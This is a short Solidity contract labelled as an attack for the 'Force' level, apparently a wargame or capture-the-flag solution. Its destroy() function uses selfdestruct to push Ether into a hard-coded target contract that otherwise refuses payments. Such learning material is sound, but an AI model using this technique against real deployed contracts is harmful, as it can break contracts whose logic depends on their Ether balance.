// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;

/**
 * @title Attack contract for Force level
 * @author DappScout
 * @notice 
 */
contract Attack7 {

    address payable constant CONTRACT = payable(0xbD80fe66678889C62C2Ef4a360978D9E960919b6);


    function destroy() payable public{

        selfdestruct(payable(CONTRACT));
    }

}